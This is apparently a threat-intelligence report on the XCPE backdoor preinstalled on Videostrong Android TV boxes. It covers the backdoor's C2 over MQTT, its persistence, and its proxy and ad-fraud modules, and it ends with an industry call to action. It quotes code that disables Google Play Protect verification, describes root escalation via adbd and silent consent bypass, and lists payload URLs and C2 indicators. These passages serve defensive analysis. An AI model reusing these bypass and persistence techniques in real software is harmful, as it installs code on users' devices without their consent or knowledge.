  • Silent Application Installation: Fetches remote APKs to a temporary directory.

  • Disable Google Play Protect: To bypass security, 

    AppUtils.disablePackageVerify()
    targets the global setting "
    package_verifier_user_consent
    " via 
    Settings.Global.putInt
    and sets it to 
    -1
    , disabling Google Play Protect app verification.

  • Arbitrary Shell Execution: Executes remote commands via 

    sh
    under system UID privilege level. Results are published to the MQTT broker.

  • Shell Script Execution: Downloads and executes shell scripts via 

    x.cpe.util.RunCmds
    .

  • Remote Desktop Monitor & Screen Capture: Utilizes 

    android.app.Instrumentation.sendKeyDownUpSync()
    to inject keycodes and Java reflection on hidden APIs (
    android.view.SurfaceControl.screenshot
    / 
    SurfaceControl$ScreenshotHardwareBuffer
    ) to continuously capture the screen, compress to JPEG, and publish over MQTT.

  • Network Reconnaissance: Invokes embedded binaries (

    libtraceroute.so
    ) to fingerprint the victim network, and perform standard ping tests. The binaries also perform robust AS-lookup WHOIS routing queries.

Our analysis of the C2 data indicates the preponderance of interactions with victim devices were related to module install, uninstall, and configuration actions. We also observed Videostrong operators executing sensitive actions on the device, including capturing live screenshots; injecting keystrokes; exfiltrating sensitive data including account information, device information, package inventories, and system logs; and executing shell scripts and commands, including to establish reverse shells on devices.

Loader and Execution Engine Details

Earlier versions of 

x.cpe
directly embedded malicious monetization modules. In late 2024 – possibly as a response to earlier Google enforcement related to BadBox – Videostrong removed malicious modules from 
x.cpe
and introduced a separate malicious package they developed, 
com.abc.nexus
, which 
x.cpe
routes instructions and data to via Inter-Process Communication (IPC). Modern variants of 
x.cpe
facilitate C2 communications but pass configuration parameters, module updates, and other payloads to 
com.abc.nexus
as the execution engine. We believe the actor may have evolved the malware in this way in an attempt to ensure 
x.cpe
could remain undetected.

Upon boot, 

com.abc.nexus.broadcast.BootReceiver
broadcasts the 
com.abc.nexus.data
intent, bootstrapping 
com.abc.nexus.service.CoreService
. Within 
CoreService.onCreate
, the application performs maintenance and persistence tasks. The main logic sets up a listener through 
RemoteMessageHandler
for IPC communications from 
x.cpe,
and parses JSON payloads received from it.  

After these steps, 

CoreService
initializes the monetization modules. 
com.abc.nexus
services extract and orchestrate a series of nested native libraries and dynamically downloaded secondary payloads which vary significantly based on sample. Many versions of 
com.abc.nexus
come preloaded with four or more embedded modules, while other versions contain as few as one. The most common malware modules include 
TitanService
, 
BwmService
, 
AdtimeService
, 
lb102Service
, and 
LinkfogService
(sometimes called 
AgentService)
. Discussion of these and other modules can be found in the monetization modules section. 

Persistence and Evasion

The malware operators implement a number of mechanisms to establish persistence and thwart detection and analysis.

As a system preload, 

x.cpe
cannot be removed by the user. If 
x.cpe
is uninstalled from 
/data/app/
, upon reboot the 
x.cpe
service 
BootReceiver
follows the same routine outlined above and reinstalls the package. 

The backdoor is able to silently download additional files to the device and execute them without user consent because it first wipes user consent configuration on the device and then disables Google Play Protect:

public static void disablePackageVerify() {
    PreferenceUtils.setPackageVerifyFromUser(CPEApp.instance, true);
    AppUtils.setPackageVerify(-1); // Actioning a bypass against GPP evaluation
}

Figure 2: Disabling Google Play Protect

In many variants of 

com.abc.nexus,
we observed the extraction of a sophisticated anti-analysis and process hardening utility 
libseccomp_guard.so
, which runs prior to the initialization of malware modules, to ensure they remain protected from automated sandboxes and security instrumentation. It filters system calls to prevent the pausing or termination of individual threads, denies cross-process interference to ensure isolation, and prevents the spawning of child processes. 

Evolution

Since August 2026, new dropper packages have been installed via the MQTT channel, which appear to be synchronized with the mass-uninstallation of 

com.abc.nexus
across the botnet. We assess this may represent a new evolution of the malware to further evade detection. These new packages are disguised as Android system applications, with names such as 
com.android.system.ntp
and
 com.android.sso.auth.handler
. Where 
com.abc.nexus
could act as a general purpose loader and execution engine (executing instructions passed to it from 
x.cpe
), these packages instead install single monetization modules (such as AppSalt).  Multiple variants of these packages extract a native ELF file, 
libexploit.so
, which in turn executes functions 
nativeAdbRoot()
and 
nativeAdbShell()
. These functions restart the local 
adbd
service as root, and initiate an ADB shell connection. Following this, the app uses the connection to install itself in the 
system
partition.  The 
system
partition is remounted as read-write and the payload replicates itself to a newly minted directory in 
/system/priv-app/
and creates an XML file at 
/system/etc/permissions/privapp-permissions-.xml
. This file grants the malware 
android.permission.INSTALL_PACKAGES
and 
android.permission.REBOOT
. 

The app configures the malware modules through hardcoded configuration parameters, and does not listen for 

x.cpe
IPC messages. The app itself is controlled by the operators via shell scripts pushed via the broker and executed by 
x.cpe
. These include setting the property 
persist.networkstack.uninstall
(which, when read by the app, triggers uninstallation and cleanup), 
persist.networkstack.skip_system_install
(which skips system installation, forcing it to remain running in 
/data/app/
), and 
persist.networkstack.install_time
(which implements timestomping, overriding the default timestamp of the app to align with the other packages installed in the 
system
directory).  

Botnet composition

The botnet is globally dispersed, with certain concentrations possibly implying market penetration for the brand distributor.

Figure 3: Global distribution of x.cpe

While the overwhelming majority of the infected devices in the XCPE botnet are Android TV set-top boxes, we observed a number of other infected Android-based IoT devices, including telehealth devices, karaoke machines, and digital signage devices.

Monetization

x.cpe
loads a variety of malicious modules for monetization. Most often the modules are associated with residential proxy services and bandwidth sharing, but we've also observed ad fraud modules. Given that a single device may be running multiple modules providing the same or similar functionality (e.g., as many as three residential proxy SDKs installed on a single device) it is clear that Videostrong seeks to monetize every infected device to the greatest extent possible. 

Services are loaded by 

com.abc.nexus
via three methods:

  • Native Daemons: Native ELF binaries prepackaged with 

    com.abc.nexus
    , which are unpacked to data directories and spawned as background processes with system/root privileges.

  • Embedded SDKs / Services: Java/Kotlin SDKs compiled directly into Nexus and invoked via Android Service lifecycles or IPC broadcast triggers.

  • Dynamic Droppers & Secondary APK Installers: Downloader function that pulls remote native ELFs or secondary standalone APKs and invokes system package managers. Nexus receives messages from 

    x.cpe
    directing it to download specific modules.

Malware modules loaded via the backdoor include the following:

Residential Proxy / Bandwidth Sharing Modules

LINKFOG

Com.abc.nexus
’s 
LinkfogService
unpacks a Go binary named 
lw_android_agent
  from 
assets/
to local app storage and supplies it with vendor parameters. This service silently turns infected devices into residential edge computing and PCDN proxy exit nodes. It connects to FRP reverse tunnels, and uploads bandwidth accounting metrics to Linkfog API backends. Linkfog (operated by Beijing Linkfog Technology via 点心云 / Dianxinyun) brands itself as a “Peer-to-Peer Content Delivery Network”.

Jaguar

The

 com.abc.nexus
AdtimeService
extracts 
libjaguar.so
from 
assets/
. The file is an unobfuscated 32-bit ELF binary written in C, compiled as a native Android binary. It utilizes JNI (Java Native Interface) to initialize its core routines, dynamically derives a ChaCha20 decryption key via ARM NEON SIMD instructions to decode heavily obfuscated configurations , and establishes an encrypted C2 channel. Upon successful registration, the C2 responds with JSON configuration specifying proxy endpoints. The proxy command loop 
x_ctrl_do_ctrl_msg
delegates proxy operations based on incoming JSON variable commands, and is capable of both TCP and UDP relay.

AppSalt / Honeygain

AppSalt SDK is the residential proxy SDK owned by Honeygain, which is in turn owned by Oxylabs. 

com.abc.nexus.service.CoreService
initializes Appsalt SDK. First, the application obtains an Appsalt SDK API key from a native library 
libnative_keys.so
by calling its 
getAppsaltKey()
function. Appsalt SDK is initialized without displaying a consent screen - instead it explicitly calls the 
optIn()
method which sets a consent flag without displaying any user interface. During Appsalt SDK startup it checks the application's installation source and stops execution if the application was installed from the official Google Play Store. 

Once Appsalt is successfully initialized it establishes a WebSocket connection with the primary command and control domain. Appsalt uses JSON-formatted messages for initial check-in (registration) and heartbeat requests. Appsalt command and control servers use MessagePack formatted messages to issue commands pertaining to proxy operations. Appsalt SDK is configured with an initial set of domains that act as proxy gateways. The list of proxy gateways can be updated by the command and control server. The device establishes UDP / QUIC connections with these gateways.

BWM / IPWeb

This residential proxy and bandwidth-sharing node is implemented through the 

com.abc.nexus.service.BwmService
component (sometimes named 
com.abc.nexus.service.SN4Service)
and its associated SDK. Upon initialization, it secures itself within an isolated sandbox environment, captures device telemetry, and registers with a remote server over UDP. From this C2, it receives instructions to initiate a Java NIO TCP multiplexed proxy tunnel. The service functions to route arbitrary traffic through the infected device on behalf of a remote threat actor.

GaGaNode

GaGaNode is the first-party SDK owned by residential proxy operator IPCola. It connects over TCP to a primary C2 server and sends heartbeat beacon data over HTTP POST to a separate server. The SDK both contains its own proxy relay functionality, and it initializes additional proxy SDKs from affiliates. Upon device registration to the C2, 

com.gaganode.sdk.node.endpoint.a
receives incoming packets from relay servers and places them in queue for the client to read and proxy through its exit node socket. The service manages multiple proxy sessions at once (referred to as clients), and each client has its own tcp/udp queue for messages.

We observe GaGaNode initializing PopaNet/NetNut and EarnFM Fleet residential proxy SDKs. GaGaNode/IPCola is thus likely able to further monetize its SDK and offer these affiliates access to the infected exit nodes.

NetNut / Popanet

Popanet is a residential proxy SDK developed by NetNut, a residential proxy operator. The GaGaNode module initiates the Popanet SDK (

io.popanet.Popa
). This malware is identical to the malware described in our previous disruption of NetNut. All C2 infrastructure used by Popanet samples connected to 
x.cpe
was taken down as part of the earlier Netnut disruption.

Traffmonetizer

The Traffmonetizer SDK is initialized inside the primary background service com.abc.nexus.service.CoreService. CoreService operation depends on the availability of policy JSON provided by the XCPE backdoor via IPC. Before calling Traffmonetizer SDK initialization methods, the application obtains a Traffmonetizer SDK API key from the native library 

libnative_keys.so
by calling its 
getTraffmonetizerKey()
function. 

Traffmonetizer functionality is split between two components where the Android SDK acts as a state machine which handles native library callbacks through asynchronous event dispatchers. 

ServiceBloc
monitors connection status updates from the native callbacks and 
ConnectivityBloc
monitors Wi-Fi and mobile data network changes. 

Traffmonetizer native library initialization and configuration is followed by a call to 

baseClientStart()
which establishes a WebSocket connection to a C2 server. Traffmonetizer uses a single WebSocket (TLS) connection to the command and control server to multiplex control messages and tunneled connections (supports both TCP and UDP). Traffmonetizer also supports “Content Delivery” tunneling which allows nodes to tunnel bandwidth-intensive traffic.

EarnFM

EarnFM is a residential proxy provider, and Fleet SDK is the provider’s SDK that enrolls devices as exit nodes into the proxy network. In 

com.abc.nexus
, FleetSDK is initialized by 
com.gaganode.sdk
as mentioned above. FleetSdk then loads native binary 
libfleetshare.so
. 

FleetSDK establishes a persistent WebSocket connection with its primary C2 server for routing arbitrary network traffic. Incoming tasking frames are received over the WebSocket channel and processed in a continuous loop. Messages contain structured JSON commands instructing the daemon to connect to specific remote hosts, with support for both TCP and UDP.

Backdoor Modules

Spirit

Spirit is a dynamic code loading backdoor. Spirit employs multiple stages. The first stage payload fetches device information (hardware, operating system, and manufacturer/brand information and geolocation), posting it over HTTP to a hardcoded C2 server, and fetches a list of additional modules to download from the server. The second stage communicates with a separate server, and is used for tasking, config sync, module retrieval, heartbeats, and reporting. We have observed Spirit loading a significant amount of additional malware monetization modules, including some of the families already directly loaded by 

com.abc.nexus
.

Moyu

Moyu is a 3-stage backdoor previously observed as part of the BadBox enterprise. On 

x.cpe
-backdoored devices, we observed it initialized by 
com.abc.nexus.service.DevourService.
The first stage is an offline dropper that reconstructs and loads an embedded second stage. Stage two polls an update C2 to download, decrypt, and load the third stage. Stage three implements a backdoor with hidden Double-WebView click/conversion fraud, persistent clipboard hijacking, and secondary dynamically loaded JAR execution and a separate residential proxy trojan.

Bird

Bird is a 2-stage backdoor previously tied to the BadBox enterprise. Stage 1 beacons a device and analysis-environment profile to its C2 server and, when the server approves, downloads, decrypts, and loads the Stage 2 JAR. Stage 2 implements a dynamic code loading backdoor (two plugin loaders plus a C2-driven reflective method invoker), a separate downloader (silent APK installation and Accessibility-driven Google Play installs), and ad abuse (lockscreen ads, overlays, browser launches).

Fission

Fission is a dynamic code loading (DCL) backdoor embedded within standard video applications (e.g., 

com.newtv.cboxtv
). Upon initialization, the first stage plugin contacts its C2 server to download additional modules. The decrypted second stage payload fetches execution targets and tracking URLs from the C2. The request sends an unencrypted POST request with tracking metrics from the internal 
DeviceManager.

The payload we observed was configured to commit ad fraud. Rather than rendering visible advertisements in a 

WebView
or UI component, the Stage 2 plugin executes headlessly in the background. The module queries ad server endpoints in the background to retrieve ad placement responses, parses out both primary impression beacons (
pvm
) and third-party tracking monitor URLs (
pvtpm
), and immediately fires HTTP GET requests to each tracking endpoint to register a fake ad view without displaying creative content. When executing inside specific smart-TV application stores (
com.changhong.appstore
or 
com.tcl.appmarket2
), the plugin initializes and triggers the ad SDK directly to report synthetic ad exposures.

Ad-Fraud

HiddenView

We observed HiddenView loaded remotely from the attacker’s Github channel as 

com.ota.service
. It is a standalone ad fraud application capable of running in the background using a transparent window overlay, using hidden WebViews to load targeted web pages and simulate user interaction (scrolling, clicking, typing, media playback), playing media unattended, and capturing the user’s screen.

How the pieces come together

Configuration messages pushed via MQTT (action 

ext/lib/config
) demonstrate how 
x.cpe
, 
com.abc.nexus
and various monetization modules function together. 

Upon registration, subscribed devices receive a 

ext/lib/config
message, which contains configuration parameters for malicious plugins. This includes:

Limits on system resources:

"constraints": [
    {
      "cpu": 70,
      "ioRead": 5000,
      "ioWrite": 5000,
      "libCode": "linkfog",
      "memory": 50,
      "reportAlarm": true,
      "trigger": 3
    }

Figure 4: System resource limits configuration payload

Module name, download location per architecture, hashes, and weight (relative priority for system resources):

 "infos": [
    {
      "libChannel": "SZKJ",
      "libCode": "linkfog",
      "libResource": [
        {
          "address": "https://github.com/Aviciiii/ott/releases/download/cpe_ext_lib/lw_android_agent_special_ndk_64",
          "architecture": "arm64-v8a",
          "md5": "abd0b6de6fdf78234f5dab098d5dd229"
        },
        {
          "address": "https://github.com/Aviciiii/ott/releases/download/cpe_ext_lib/lw_android_agent_special_ndk_32_20250717",
          "architecture": "armeabi-v7a",
          "md5": "d8971688d1929b6ed915b80eca7e7e3f"
        }
      ],
      "libWeight": 5
    },

Figure 5: Module configuration payload

Devices are assigned to one of six timezone-separated pools on the 

ott.szbboys[.]com
domain:

"region": "Iraq",
  "serverPool": {
    "defaultPool": "Pool5",
    "lastUpdated": "2025-08-06 17:00:00",

Figure 6: Server Pool configuration payload

The “

policys
” section instructs 
com.abc.nexus
which modules to download and run:

 "status": [
    {
      "enable": true,
      "libCode": "linkfog"
    },
    {
      "enable": false,
      "libCode": "bwm"
    },
    {
      "enable": false,
      "libCode": "adtime"
    },
    {
      "enable": false,
      "libCode": "admoyu"
    },
    {
      "enable": false,
      "libCode": "titan"
    },
    {
      "enable": false,
      "libCode": "lb102"
    }
  ],

Figure 7: Module activation payload

x.cpe
passes on these configuration parameters to 
com.abc.nexus
for the given module on the device. Devices report bandwidth usage and alarms back to 
serverPool
to stay within the configured constraints. 

When 

com.abc.nexus
acknowledges receiving the bundle, 
x.cpe
immediately publishes 
ext/lib/config/reply
back to the MQTT broker:

"code": 0,
  "msg": "success",
  "data": "received data success and applying",
  "async": true,
  "immediately": false

Figure 8: x.cpe response payload

Infrastructure

As previously mentioned, devices first connect to various endpoints on 

*.anyevonline[.]com
for initial bootstrap, registration, and configuration. Earlier malware versions used various hostnames of 
{*tms | *ott | *ota}.szbboys[.]com
for the same purpose. 

While earlier versions of the malware used HTTP for C2, and then a blended C2 approach with both HTTP and MQTT, static analysis of current versions indicate they exclusively send/receive C2 communications via MQTT. A single MQTT broker orchestrates all MQTT C2 communications for samples we’ve identified. Hostname 

mqtt.szbboys[.]com
is resolved by hosts
 219.134.163[.]210
and 
219.134.163[.]211.
It listens on non-standard MQTT ports 3885-3887. 

The malware constructs OkHttp requests for file downloads after tasking via the MQTT broker. Files are hosted on several services:

  • Several Github release pages

  • The 

    filemail[.]com
    file sharing service

  • Two operator-controlled servers hosted on IPs

     38.145.197[.]135
    and 
    23.94.49[.]57

Netflow telemetry on the broker nodes (

219.134.163[.]210/.211
) indicates that while infected devices communicate over ports 3885–3887, operators likely manage the broker and dispatch tasking via interactive HTTP REST API (port 8082), WebSocket (port 8083), and EMQX web administration console (port 18083) sessions originating from non-bot IP space. 

Call to Action

While we believe our actions have seriously impacted over a dozen malicious actors, the underlying illicit market is resilient. Backdoor operators, ad-fraud rings, and residential proxy providers operate as an interconnected supply chain, and when one component is disrupted, operators quickly pivot to new loaders or rival monetization SDKs. Creating lasting change requires accountability across the hardware supply chain, the residential proxy industry, and the broader technology ecosystem.

Accountability and Reform

A device manufacturer intentionally infecting their users with malware is an unacceptable breach of trust. By turning everyday hardware into persistent beachheads for criminal affiliates, Videostrong prioritized illicit post-sale recurring revenue over the safety and privacy of its users. Downstream hardware brands, white-label resellers, telecommunications providers, and online e-commerce marketplaces also share responsibility for closing this vector. Retailers and distributors should require independent security audits from Original Design Manufacturers (ODMs) and swiftly delist manufacturers implicated in supply-chain abuse.

Residential proxy providers have been able to flourish under the guise of legitimate businesses. While some providers may claim to behave ethically and only enroll devices with the clear consent of consumers, any claims of "ethical sourcing" must be backed by transparent, auditable proof of user consent. In our analysis, these proxy operators only seek consent when they are forced due to platform policy and enforcement. Silent opt-in without user consent remains the most prevalent means by which devices are turned into exit nodes.

Empowering and Protecting the Consumer

Residential proxies are an understudied area of risk for consumers, and more can be done to raise awareness. Consumers should be extremely wary of applications that offer payment in exchange for "unused bandwidth" or "sharing your internet." These applications are primary ways for illicit proxy networks to grow, and could open security vulnerabilities on the device’s home network. We urge users to stick to app stores you trust, review permissions for third-party VPNs and proxies, and ensure built-in security protections like Google Play Protect are active.

Consumers should only purchase connected devices, such as set-top boxes, from reputable manufacturers. Our Android TV website provides the most up-to-date list of partners.

Industry Collaboration

We encourage mobile platforms, ISPs, online marketplaces and other tech platforms to continue sharing intelligence and implementing best practices to identify malicious backdoors, illicit proxy networks, and other harmful software and limit their harms.
